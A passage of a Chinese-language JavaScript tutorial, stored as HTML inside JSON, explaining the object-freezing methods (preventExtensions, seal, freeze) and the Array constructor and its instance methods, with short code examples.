{ get a(){ return 1 } })</code></pre><p>上面代码中，<code>hasOwnProperty</code>那一行用来过滤掉继承的属性，否则会报错，因为<code>Object.getOwnPropertyDescriptor</code>读不到继承属性的属性描述对象。</p>\n\n        <h2>\n            <a href='#控制对象状态' class='header-anchor'>#</a>\n            <span>控制对象状态</span>\n        </h2>\n    <p>有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是<code>Object.preventExtensions</code>，其次是<code>Object.seal</code>，最强的是<code>Object.freeze</code>。</p>\n\n        <h3>\n            <a href='#Object.preventExtensions()' class='header-anchor'>#</a>\n            <span>Object.preventExtensions()</span>\n        </h3>\n    <p><code>Object.preventExtensions</code>方法可以使得一个对象无法再添加新的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: &#039;hello&#039;\n});\n// TypeError: Cannot define property:p, object is not extensible.\n\nobj.p = 1;\nobj.p // undefined</code></pre><p>上面代码中，<code>obj</code>对象经过<code>Object.preventExtensions</code>以后，就无法添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.isExtensible()' class='header-anchor'>#</a>\n            <span>Object.isExtensible()</span>\n        </h3>\n    <p><code>Object.isExtensible</code>方法用于检查一个对象是否使用了<code>Object.preventExtensions</code>方法。也就是说，检查是否可以为一个对象添加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nObject.isExtensible(obj) // true\nObject.preventExtensions(obj);\nObject.isExtensible(obj) // false</code></pre><p>上面代码中，对<code>obj</code>对象使用<code>Object.preventExtensions</code>方法以后，再使用<code>Object.isExtensible</code>方法，返回<code>false</code>，表示已经不能添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.seal()' class='header-anchor'>#</a>\n            <span>Object.seal()</span>\n        </h3>\n    <p><code>Object.seal</code>方法使得一个对象既无法添加新属性，也无法删除旧属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;hello&#039; };\nObject.seal(obj);\n\ndelete obj.p;\nobj.p // &quot;hello&quot;\n\nobj.x = &#039;world&#039;;\nobj.x // undefined</code></pre><p>上面代码中，<code>obj</code>对象执行<code>Object.seal</code>方法以后，就无法添加新属性和删除旧属性了。</p>\n<p><code>Object.seal</code>实质是把属性描述对象的<code>configurable</code>属性设为<code>false</code>，因此属性描述对象不再能改变了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;a&#039;\n};\n\n// seal方法之前\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }\n\nObject.seal(obj);\n\n// seal方法之后\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: false\n// }\n\nObject.defineProperty(o, &#039;p&#039;, {\n  enumerable: false\n})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，使用<code>Object.seal</code>方法之后，属性描述对象的<code>configurable</code>属性就变成了<code>false</code>，然后改变<code>enumerable</code>属性就会报错。</p>\n<p><code>Object.seal</code>只是禁止新增或删除属性，并不影响修改某个属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\nObject.seal(obj);\nobj.p = &#039;b&#039;;\nobj.p // &#039;b&#039;</code></pre><p>上面代码中，<code>Object.seal</code>方法对<code>p</code>属性的<code>value</code>无效，是因为此时<code>p</code>属性的可写性由<code>writable</code>决定。</p>\n\n        <h3>\n            <a href='#Object.isSealed()' class='header-anchor'>#</a>\n            <span>Object.isSealed()</span>\n        </h3>\n    <p><code>Object.isSealed</code>方法用于检查一个对象是否使用了<code>Object.seal</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isSealed(obj) // true</code></pre><p>这时，<code>Object.isExtensible</code>方法也返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isExtensible(obj) // false</code></pre>\n        <h3>\n            <a href='#Object.freeze()' class='header-anchor'>#</a>\n            <span>Object.freeze()</span>\n        </h3>\n    <p><code>Object.freeze</code>方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nobj.p = &#039;world&#039;;\nobj.p // &quot;hello&quot;\n\nobj.t = &#039;hello&#039;;\nobj.t // undefined\n\ndelete obj.p // false\nobj.p // &quot;hello&quot;</code></pre><p>上面代码中，对<code>obj</code>对象进行<code>Object.freeze()</code>以后，修改属性、新增属性、删除属性都无效了。这些操作并不报错，只是默默地失败。如果在严格模式下，则会报错。</p>\n\n        <h3>\n            <a href='#Object.isFrozen()' class='header-anchor'>#</a>\n            <span>Object.isFrozen()</span>\n        </h3>\n    <p><code>Object.isFrozen</code>方法用于检查一个对象是否使用了<code>Object.freeze</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\nObject.isFrozen(obj) // true</code></pre><p>使用<code>Object.freeze</code>方法以后，<code>Object.isSealed</code>将会返回<code>true</code>，<code>Object.isExtensible</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nObject.isSealed(obj) // true\nObject.isExtensible(obj) // false</code></pre><p><code>Object.isFrozen</code>的一个用途是，确认某个对象没有被冻结后，再对它的属性赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nif (!Object.isFrozen(obj)) {\n  obj.p = &#039;world&#039;;\n}</code></pre><p>上面代码中，确认<code>obj</code>没有被冻结后，再对它的属性赋值，就不会报错了。</p>\n\n        <h3>\n            <a href='#局限性' class='header-anchor'>#</a>\n            <span>局限性</span>\n        </h3>\n    <p>上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nproto.t = &#039;hello&#039;;\nobj.t\n// hello</code></pre><p>上面代码中，对象<code>obj</code>本身不能新增属性，但是可以在它的原型对象上新增属性，就依然能够在<code>obj</code>上读到。</p>\n<p>一种解决方案是，把<code>obj</code>的原型也冻结住。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nObject.preventExtensions(proto);\n\nproto.t = &#039;hello&#039;;\nobj.t // undefined</code></pre><p>另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: 1,\n  bar: [&#039;a&#039;, &#039;b&#039;]\n};\nObject.freeze(obj);\n\nobj.bar.push(&#039;c&#039;);\nobj.bar // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>obj.bar</code>属性指向一个数组，<code>obj</code>对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Array 对象","link":"/stdlib/array.html"}],"content":"\n        <h1>\n            <a href='#Array-对象' class='header-anchor'>#</a>\n            <span>Array 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h2>\n    <p><code>Array</code>是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\narr.length // 2\narr // [ empty x 2 ]</code></pre><p>上面代码中，<code>Array</code>构造函数的参数<code>2</code>，表示生成一个两个成员的数组，每个位置都是空值。</p>\n<p>如果没有使用<code>new</code>，运行结果也是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\n// 等同于\nvar arr = Array(2);</code></pre><p><code>Array</code>构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 无参数时，返回一个空数组\nnew Array() // []\n\n// 单个正整数参数，表示返回的新数组的长度\nnew Array(1) // [ empty ]\nnew Array(2) // [ empty x 2 ]\n\n// 非正整数的数值作为参数，会报错\nnew Array(3.2) // RangeError: Invalid array length\nnew Array(-3) // RangeError: Invalid array length\n\n// 单个非数值（比如字符串、布尔值、对象等）作为参数，\n// 则该参数是返回的新数组的成员\nnew Array(&#039;abc&#039;) // [&#039;abc&#039;]\nnew Array([1]) // [Array[1]]\n\n// 多参数时，所有参数都是返回的新数组的成员\nnew Array(1, 2) // [1, 2]\nnew Array(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;) // [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p>可以看到，<code>Array</code>作为构造函数，行为很不一致。因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// bad\nvar arr = new Array(1, 2);\n\n// good\nvar arr = [1, 2];</code></pre><p>注意，如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回<code>undefined</code>，但实际上该位置没有任何值。虽然可以取到<code>length</code>属性，但是取不到键名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = new Array(3);\nvar b = [undefined, undefined, undefined];\n\na.length // 3\nb.length // 3\n\na[0] // undefined\nb[0] // undefined\n\n0 in a // false\n0 in b // true</code></pre><p>上面代码中，<code>a</code>是一个长度为3的空数组，<code>b</code>是一个三个成员都是<code>undefined</code>的数组。读取键值的时候，<code>a</code>和<code>b</code>都返回<code>undefined</code>，但是<code>a</code>的键位都是空的，<code>b</code>的键位是有值的。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Array.isArray()' class='header-anchor'>#</a>\n            <span>Array.isArray()</span>\n        </h3>\n    <p><code>Array.isArray</code>方法返回一个布尔值，表示参数是否为数组。它可以弥补<code>typeof</code>运算符的不足。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\ntypeof arr // &quot;object&quot;\nArray.isArray(arr) // true</code></pre><p>上面代码中，<code>typeof</code>运算符只能显示数组的类型是<code>Object</code>，而<code>Array.isArray</code>方法可以识别数组。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#valueOf()，toString()' class='header-anchor'>#</a>\n            <span>valueOf()，toString()</span>\n        </h3>\n    <p><code>valueOf</code>方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的<code>valueOf</code>方法不尽一致，数组的<code>valueOf</code>方法返回数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.valueOf() // [1, 2, 3]</code></pre><p><code>toString</code>方法也是对象的通用方法，数组的<code>toString</code>方法返回数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.toString() // &quot;1,2,3&quot;\n\nvar arr = [1, 2, 3, [4, 5, 6]];\narr.toString() // &quot;1,2,3,4,5,6&quot;</code></pre>\n        <h3>\n            <a href='#push()，pop()' class='header-anchor'>#</a>\n            <span>push()，pop()</span>\n        </h3>\n    <p><code>push</code>方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr.push(1) // 1\narr.push(&#039;a&#039;) // 2\narr.push(true, {}) // 4\narr // [1, &#039;a&#039;, true, {}]</code></pre><p>上面代码使用<code>push</code>方法，往数组中添加了四个成员。</p>\n<p><code>pop</code>方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr.pop() // &#039;c&#039;\narr // [&#039;a&#039;, &#039;b&#039;]</code></pre><p>对空数组使用<code>pop</code>方法，不会报错，而是返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[].pop() // undefined</code></pre><p><code>push</code>和<code>pop</code>结合使用，就构成了“后进先出”的栈结构（stack）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr.push(1, 2);\narr.push(3);\narr.pop();\narr // [1, 2]</code></pre><p>上面代码中，<code>3</code>是最后进入数组的，但是最早离开数组。</p>\n\n        <h3>\n            <a href='#shift()，unshift()' class='header-anchor'>#</a>\n            <span>shift()，unshift()</span>\n        </h3>\n    <p><code>shift</code>方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.shift() // &#039;a&#039;\na // [&#039;b&#039;, &#039;c&#039;]</code></pre><p><code>shift</code>方法可以遍历并清空一个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var list = [1, 2, 3, 4, 5, 6];\nvar item;\n\nwhile (item = list.shift()) {\n  console.log(item);\n}\n\nlist // []</code></pre><p><code>push</code>和<code>shift</code>结合使用，就构成了“先进先出”的队列结构（queue）。</p>\n<p><code>unshift</code>方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.unshift(&#039;x&#039;); // 4\na // [&#039;x&#039;, &#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p><code>unshift</code>方法可以接受多个参数，这些参数都会添加到目标数组头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;c&#039;, &#039;d&#039; ];\narr.unshift(&#039;a&#039;, &#039;b&#039;) // 4\narr // [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039; ]</code></pre>\n        <h3>\n            <a href='#join()' class='header-anchor'>#</a>\n            <span>join()</span>\n        </h3>\n    <p><code>join</code>方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\n\na.join(&#039; &#039;) // &#039;1 2 3 4&#039;\na.join(&#039; | &#039;) // &quot;1 | 2 | 3 | 4&quot;\na.join() // &quot;1,2,3,4&quot;</code></pre><p>如果数组成员是<code>undefined</code>或<code>null</code>或空位，会被转成空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>[undefined, null].join(&#039;#&#039;)\n// &#039;#&#039;\n\n[&#039;a&#039;,, &#039;b&#039;].join(&#039;-&#039;)\n// &#039;a--b&#039;</code></pre><p>通过<code>call</code>方法，这个方法也可以用于字符串或类似数组的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.join.call(&#039;hello&#039;, &#039;-&#039;)\n// &quot;h-e-l-l-o&quot;\n\nvar obj = { 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 };\nArray.prototype.join.call(obj, &#039;-&#039;)\n// &#039;a-b&#039;</code></pre>\n        <h3>\n            <a href='#concat()' class='header-anchor'>#</a>\n            <span>concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;hello&#039;].concat([&#039;world&#039;])\n// [&quot;hello&quot;, &quot;world&quot;]\n\n[&#039;hello&#039;].concat([&#039;world&#039;], [&#039;!&#039;])\n// [&quot;hello&quot;, &quot;world&quot;, &quot;!&quot;]\n\n[].concat({a: 1}, {b: 2})\n// [{ a: 1 }, { b: 2 }]\n\n[2].concat({a: 1})\n// [2, {a: 1}]</code></pre><p>除了数组作为参数，<code>concat</code>也接受其他类型的值作为参数，添加到目标数组尾部。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].concat(4, 5, 6)\n// [1, 2, 3, 4, 5, 6]</code></pre><p>如果数组成员包括对象，<code>concat</code>方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { a: 1 };\nvar oldArray = [obj];\n\nvar newArray = oldArray.concat();\n\nobj.a = 2;\nnewArray[0].a // 2</code></pre><p>上面代码中，原数组包含一个对象，<code>concat</code>方法生成的新数组包含这个对象的引用。所以，改变原对象以后，新数组跟着改变。</p>\n\n        <h3>\n            <a href='#reverse()' class='header-anchor'>#</a>\n            <span>reverse()</span>\n        </h3>\n    <p><code>reverse</code>方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.reverse() // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]\na // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]</code></pre>\n        <h3>\n            <a href='#slice()' class='header-anchor'>#</a>\n            <span>slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于提取目标数组的一部分，返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.slice(start, end);</code></pre><p>它的第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.slice(0) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\na.slice(1) // [&quot;b&quot;, &quot;c&quot;]\na.slice(1, 2) // [&quot;b&quot;]\na.slice(2, 6) // [&quot;c&quot;]\na.slice() // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，最后一个例子<code>slice</code>没有参数，实际上等于返回一个原数组的拷贝。</p>\n<p>如果<code>slice</code>方法的参数是负数，则表示倒数计算的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(-2) // [&quot;b&quot;, &quot;c&quot;]\na.slice(-2, -1) // [&quot;b&quot;]</code></pre><p>上面代码中，<code>-2</code>表示倒数计算的第二个位置，<code>-1</code>表示倒数计算的第一个位置。</p>\n<p>如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(4) // []\na.slice(2, 1) // []</code></pre><p><code>slice</code>方法的一个重要应用，是将类似数组的对象转为真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.slice.call({ 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 })\n// [&#039;a&#039;, &#039;b&#039;]\n\nArray.prototype.slice.call(document.querySelectorAll(&quot;div&quot;));\nArray.prototype.slice.call(arguments);</code></pre><p>上面代码的参数都不是数组，但是通过<code>call</code>方法，在它们上面调用<code>slice</code>方法，就可以把它们转为真正的数组。</p>\n\n        <h3>\n            <a href='#splice()' class='header-anchor'>#</a>\n            <span>splice()</span>\n        </h3>\n    <p><code>splice</code>方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.splice(start, count, addElement1, addElement2, ...);</code></pre><p><code>splice</code>的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码从原数组4号位置，删除了两个数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2, 1, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, 1, 2]</code></pre><p>上面代码除了删除成员，还插入了两个新成员。</p>\n<p>起始位置如果是负数，就表示从倒数位置开始删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(-4, 2) // [&quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码表示，从倒数第四个位置<code>c</code>开始删除两个成员。</p>\n<p>如果只是单纯地插入元素，<code>splice</code>方法的第二个参数可以设为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 1, 1];\n\na.splice(1, 0, 2) // []\na // [1, 2, 1, 1]</code></pre><p>如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\na.splice(2) // [3, 4]\na // [1, 2]</code></pre>\n        <h3>\n            <a href='#sort()' class='header-anchor'>#</a>\n            <span>sort()</span>\n        </h3>\n    <p><code>sort</code>方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;d&#039;, &#039;c&#039;, &#039;b&#039;, &#039;a&#039;].sort()\n// [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;]\n\n[4, 3, 2, 1].sort()\n// [1, 2, 3, 4]\n\n[11, 101].sort()\n// [101, 11]\n\n[10111, 1101, 111].sort()\n// [10111, 1101, 111]</code></pre><p>上面代码的最后两个例子，需要特殊注意。<code>sort</code>方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以<code>101</code>排在<code>11</code>的前面。</p>\n<p>如果想让<code>sort</code>方法按照自定义方式排序，可以传入一个函数作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[10111, 1101, 111].sort(function (a, b) {\n  return a - b;\n})\n// [111, 1101, 10111]</code></pre><p>上面代码中，<code>sort</code>的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于<code>0</code>，表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>[\n  { name: &quot;张三&quot;, age: 30 },\n  { name: &quot;李四&quot;, age: 24 },\n  { name: &quot;王五&quot;, age: 28  }\n].sort(function (o1, o2) {\n  return o1.age - o2.age;\n})\n// [\n//   { name: &quot;李四&quot;, age: 24 },\n//   { name: &quot;王五&quot;, age: 28  },\n//   { name: &quot;张三&quot;, age: 30 }\n// ]</code></pre>\n        <h3>\n            <a href='#map()' class='header-anchor'>#</a>\n            <span>map()</span>\n        </h3>\n    <p><code>map</code>方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var numbers = [1, 2, 3];\n\nnumbers.map(function (n) {\n  return n + 1;\n});\n// [2, 3, 4]\n\nnumbers\n// [1, 2, 3]</code></pre><p>上面代码中，<code>numbers</code>数组的所有成员依次执行参数函数，运行结果组成一个新数组返回，原数组没有变化。</p>\n<p><code>map</code>方法接受一个函数作为参数。该函数调用时，<code>map</code>方法向它传入三个参数：当前成员、当前位置和数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].map(function(elem, index, arr) {\n  return elem * index;\n});\n// [0, 2, 6]</code></pre><p>上面代码中，<code>map</code>方法的回调函数有三个参数，<code>elem</code>为当前成员的值，<code>index</code>为当前成员的位置，<code>arr</code>为原数组（<code>[1, 2, 3]</code>）。</p>\n<p><code>map</code>方法还可以接受第二个参数，用来绑定回调函数内部的<code>this</code>变量（详见《this 变量》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\n[1, 2].map(function (e) {\n  return this[e];\n}, arr)\n// [&#039;b&#039;, &#039;c&#039;]</code></pre><p>上面代码通过<code>map</code>方法的第二个参数，将回调函数内部的<code>this</code>对象，指向<code>arr</code>数组。</p>\n<p>如果数组有空位，<code>map</code>方法的回调函数在这个位置不会执行，会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (n) { return &#039;a&#039; };\n\n[1, undefined, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, null, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, , 2].map(f) // [&quot;a&quot;, , &quot;a&quot;]</code></pre><p>上面代码中，<code>map</code>方法不会跳过<code>undefined</code>和<code>null</code>，但是会跳过空位。</p>\n\n        <h3>\n            <a href='#forEach()' class='header-anchor'>#</a>\n            <span>forEach()</span>\n        </h3>\n    <p><code>forEach</code>方法与<code>map</code>方法很相似，也是对数组的所有成员依次执行参数函数。但是，<code>forEach</code>方法不返回值，只用来操作数据。这就是说，如果数组遍历的目的是为了得到返回值，那么使用<code>map</code>方法，否则使用<code>forEach</code>方法。</p>\n<p><code>forEach</code>的用法与<code>map</code>方法一致，参数是一个函数，该函数同样接受三个参数：当前值、当前位置、整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>function log(element, index, array) {\n  console.log(&#039;[&#039; + index + &#039;] = &#039; + element);\n}\n\n[2, 5, 9].forEach(log);\n// [0] = 2\n// [1] = 5\n// [2] = 9</code></pre><p>上面代码中，<code>forEach</code>遍历数组不是为了得到返回值，而是为了在屏幕输出内容，所以不必使用<code>map</code>方法。</p>\n<p><code>forEach</code>方法也可以接受第二个参数，绑定参数函数的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var out = [];\n\n[1, 2, 3].forEach(function(elem) {\n  this.push(elem * elem);\n}, out);\n\nout // [1, 4, 9]</code></pre><p>上面代码中，空数组<code>out</code>是<code>forEach</code>方法的第二个参数，结果，回调函数内部的<code>this</code>关键字就指向<code>out</code>。</p>\n<p>注意，<code>forEach</code>方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用<code>for</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\nfor (var i = 0; i &lt; arr.length; i++) {\n  if (arr[i] === 2) break;\n  console.log(arr[i]);\n}\n// 1</code></pre><p>上面代码中，执行到数组的第二个成员时，就会中断执行。<code>forEach</code>方法做不到这一点。</p>\n<p><code>forEach</code>方法也会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var log = function (n) {\n  console.log(n + 1);\n};\n\n[1, undefined, 2].forEach(log)\n// 2\n// NaN\n// 3\n\n[1, null, 2].forEach(log)\n// 2\n// 1\n// 3\n\n[1, , 2].forEach(log)\n// 2\n// 3</code></pre><p>上面代码中，<code>forEach</code>方法不会跳过<code>undefined</code>和<code>null</code>，但会跳过空位。</p>\n\n        <h3>\n            <a href='#filter()' class='header-anchor'>#</a>\n            <span>filter()</span>\n        </h3>\n    <p><code>filter</code>方法用于过滤数组成员，满足条件的成员组成一个新数组返回。</p>\n<p>它的参数是一个函数，所有数组成员依次执行该函数，返回结果为<code>true</code>的成员组成一个新数组返回。该方法不会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem) {\n  return (elem &gt; 3);\n})\n// [4, 5]</code></pre><p>上面代码将大于<code>3</code>的数组成员，作为一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [0, 1, &#039;a&#039;, false];\n\narr.filter(Boolean)\n// [1, &quot;a&quot;]</code></pre><p>上面代码中，<code>filter</code>方法返回数组<code>arr</code>里面所有布尔值为<code>true</code>的成员。</p>\n<p><code>filter</code>方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem, index, arr) {\n  return index % 2 === 0;\n});\n// [1, 3, 5]</code></pre><p>上面代码返回偶数位置的成员组成的新数组。</p>\n<p><code>filter</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { MAX: 3 };\nvar myFilter = function (item) {\n  if (item &gt; this.MAX) return true;\n};\n\nvar arr = [2, 8, 3, 4, 1, 3, 2, 9];\narr.filter(myFilter, obj) // [8, 4, 9]</code></pre><p>上面代码中，过滤器<code>myFilter</code>内部有<code>this</code>变量，它可以被<code>filter</code>方法的第二个参数<code>obj</code>绑定，返回大于<code>3</code>的成员。</p>\n\n        <h3>\n            <a href='#some()，every()' class='header-anchor'>#</a>\n            <span>some()，every()</span>\n        </h3>\n    